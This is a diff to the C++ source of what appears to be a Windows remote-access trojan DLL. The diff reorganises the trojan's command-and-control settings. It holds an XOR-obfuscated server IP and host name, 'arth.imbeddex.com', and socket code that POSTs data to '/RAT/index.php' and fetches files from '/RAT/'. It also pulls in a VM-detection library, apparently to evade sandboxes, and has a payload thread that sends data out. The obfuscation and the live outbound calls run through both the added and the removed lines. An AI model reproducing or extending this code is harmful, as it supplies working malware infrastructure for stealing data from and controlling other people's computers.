@@ -1,18 +1,12 @@
 #pragma warning(disable: 4222)      // for 'DllInitialize' ordinal
-#define DEBUG 0
+constexpr int DEBUG = 0;
 
 #include <process.h>
 #include <ws2tcpip.h>
 #include <mutex>
 #include "vmaware.hpp"
 
-
-#ifndef NT_SUCCESS
-    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#endif
-
 #define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)
-
 
 //============================================================================
 
@@ -85,24 +79,30 @@ enum VM_Techniques : uint64_t
     KGT_SIGNATURE           = (1ULL << 50),
 };
 
+namespace Network_config
+{
+   constexpr int Port = 80;
+
+   constexpr unsigned char KeyAddr = 0x55;
+   constexpr unsigned char KeyHost = 0xAA;
+
+   std::vector<unsigned char> encrypted_addr = { 0x64, 0x65, 0x66, 0x7b, 0x6c, 0x67, 0x7b, 0x67, 0x66, 0x60, 0x7b, 0x67, 0x64 };
+
+   std::vector<unsigned char> encrypted_host =
+   {
+           0xE2, 0xC5, 0xD9, 0xDE, 0x90, 0x8A,                     // "Host: "
+           0xCB, 0xD8, 0xDE, 0xC2, 0x84,                           // "arth."
+           0xC3, 0xC7, 0xC8, 0xCF, 0xCE, 0xCE, 0xCF, 0xD2, 0x84,   // "imbeddex."
+           0xC9, 0xC5, 0xC7,                                       // "com"
+           0xA7, 0xA0                                              // "\r\n"
+   };
+
+}
+
 //============================================================================
 
 typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);
-
 pfnLoadLibraryA pLoadLibraryA = &LoadLibraryA;
-
-//#define ADDR "103.92.235.21"
-//#define H_NAME "Host: arth.imbeddex.com\r\n"
-#define PRT 80
-std::vector<unsigned char> encrypted_addr = { 0x64, 0x65, 0x66, 0x7b, 0x6c, 0x67, 0x7b, 0x67, 0x66, 0x60, 0x7b, 0x67, 0x64 };
-std::vector<unsigned char> encrypted_host =
-{
-        0xE2, 0xC5, 0xD9, 0xDE, 0x90, 0x8A,                     // "Host: "
-        0xCB, 0xD8, 0xDE, 0xC2, 0x84,                           // "arth."
-        0xC3, 0xC7, 0xC8, 0xCF, 0xCE, 0xCE, 0xCF, 0xD2, 0x84,   // "imbeddex."
-        0xC9, 0xC5, 0xC7,                                       // "com"
-        0xA7, 0xA0                                              // "\r\n"
-};
 
 SOCKET clientSocket = INVALID_SOCKET;
 std::mutex socketMutex;
@@ -352,8 +352,8 @@ int static socket_setup()
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(PRT);
-    if(inet_pton(AF_INET, deobfuscate(encrypted_addr, 0x55).c_str(), &serverAddr.sin_addr) != 1)
+    serverAddr.sin_port = htons(Network_config::Port);
+    if(inet_pton(AF_INET, deobfuscate(Network_config::encrypted_addr, Network_config::KeyAddr).c_str(), &serverAddr.sin_addr) != 1)
     {
 #if DEBUG
         std::cerr << "inet_pton failed to convert address.\n";
@@ -409,7 +409,7 @@ int send_data(const std::string& filename, const std::string& data)
         try
         {
             std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n" +
-                deobfuscate(encrypted_host, 0xAA) +
+                deobfuscate(Network_config::encrypted_host, Network_config::KeyHost) +
                 "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n" +
                 "Content-Type: application/octet-stream\r\n" +
                 "Connection: keep-alive\r\n\r\n" +
@@ -507,8 +507,8 @@ std::vector<unsigned char> receive_data_raw(const std::string& filename)
 
         sockaddr_in serverAddr;
         serverAddr.sin_family = AF_INET;
-        serverAddr.sin_port = htons(PRT);
-        if (inet_pton(AF_INET, deobfuscate(encrypted_addr, 0x55).c_str(), &serverAddr.sin_addr) != 1)
+        serverAddr.sin_port = htons(Network_config::Port);
+        if (inet_pton(AF_INET, deobfuscate(Network_config::encrypted_addr, Network_config::KeyAddr).c_str(), &serverAddr.sin_addr) != 1)
         {
 #if DEBUG
             std::cerr << "inet_pton failed to convert address.\n";
@@ -530,7 +530,7 @@ std::vector<unsigned char> receive_data_raw(const std::string& filename)
 
         // Send HTTP GET request
         std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
-        httpRequest += deobfuscate(encrypted_host, 0xAA);
+        httpRequest += deobfuscate(Network_config::encrypted_host, Network_config::KeyHost);
         httpRequest += "Connection: close\r\n\r\n";
 
         int bytesSent = send(TempSocket, httpRequest.c_str(), static_cast<int>(httpRequest.length()), 0);
@@ -855,7 +855,7 @@ unsigned static __stdcall PayloadThread(void* pArguments)
 
     // ----------------------
 
-    send_data("MSIMG32_pxy.txt", "Test data again :)");
+    send_data("MSIMG32_pxy.txt", " data :)");
     MessageBoxA(NULL, "Sent data", "notif", MB_OK);
 
     Sleep(1000);
